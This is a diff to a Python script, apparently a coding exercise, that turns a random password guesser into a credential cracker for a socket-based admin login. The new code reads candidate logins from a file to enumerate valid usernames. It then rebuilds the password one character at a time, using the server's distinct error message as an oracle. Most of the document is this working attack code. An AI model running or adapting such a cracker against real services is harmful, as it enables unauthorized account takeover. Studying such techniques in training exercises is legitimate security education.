@@ -1,11 +1,14 @@
 #!/usr/bin/env python
+import json
+import os
 import socket
 import argparse
 import string
 import random
 
+
 DESCRIPTION = 'Connects to an unprotected admin website '
-alpha = ''.join((string.ascii_lowercase, string.digits))
+alpha_digit = list(''.join((string.ascii_lowercase, string.digits, string.ascii_uppercase)))
 
 
 def cli_parser():
@@ -20,31 +23,58 @@ def cli_parser():
 class SocketHandler:
     """ Creates and manages both server and clients socket servers. """
 
-    def __init__(self, host, port):
+    def __init__(self, host, port, file_path):
         self.host = host
         self.port = port
         self.address = (self.host, self.port)
+        self.file_path = file_path
 
-    @staticmethod
-    def gen_pass():
-        return ''.join(random.choice(alpha) for _ in range(random.randint(1, 3)))
+        self.passes = list(self.load_file())
 
-    def client_socket(self):
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
-            client.connect(self.address)
-            while True:
-                generated_pass = self.gen_pass()
-                client.sendall(generated_pass.encode('utf-8'))
-                server_msg = client.recv(1024)
-                if server_msg.decode('utf-8') == 'Connection success!':
-                    print(generated_pass)
-                    break
+    def try_login(self):
+        current_dir = os.path.dirname(os.path.abspath(__file__))
+        with open(os.path.join(current_dir, r'logins.txt.')) as log:
+            admins = [ad.strip() for ad in log.readlines()]
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
+                client.connect(self.address)
+                for login in admins:
+                    msg = json.dumps({"login": login.strip(),
+                                      "password": " "}).encode('utf-8')
+                    client.sendall(msg)
+                    server_response = json.loads(client.recv(1024).decode('utf-8'))
+                    if server_response.get('result') == "Wrong password!":
+                        break
+                while True:
+                    initial_check = random.choice(alpha_digit)
+                    client.sendall(json.dumps({"login": login,
+                                               "password": initial_check}).encode('utf-8'))
+                    server_res = json.loads(client.recv(1024).decode('utf-8'))
+                    if server_res.get("result") == "Exception happened during login":
+                        break
+                cracked_password = initial_check
+                while True:
+                    random_digit = random.choice(alpha_digit)
+                    client.sendall(json.dumps(({"login": login,
+                                                "password": cracked_password + random_digit})).encode('utf-8'))
+                    response = json.loads(client.recv(1024).decode())
+                    if response.get('result') == "Connection success!":
+                        print(json.dumps({"login": login,
+                                          "password": cracked_password + random_digit}))
+                        break
+                    elif response.get('result') == "Exception happened during login":
+                        cracked_password += random_digit
+
+    def load_file(self):
+        current_path = os.path.dirname(os.path.abspath(__file__))
+        with open(os.path.join(current_path, self.file_path)) as f:
+            for line in f:
+                yield line.strip().upper()
 
 
 def main():
     args = cli_parser()
-    socket_class = SocketHandler(host=args.ip, port=args.port)
-    socket_class.client_socket()
+    socket_class = SocketHandler(host=args.ip, port=args.port, file_path=r'passwords.txt')
+    socket_class.try_login()
 
 
 if __name__ == '__main__':
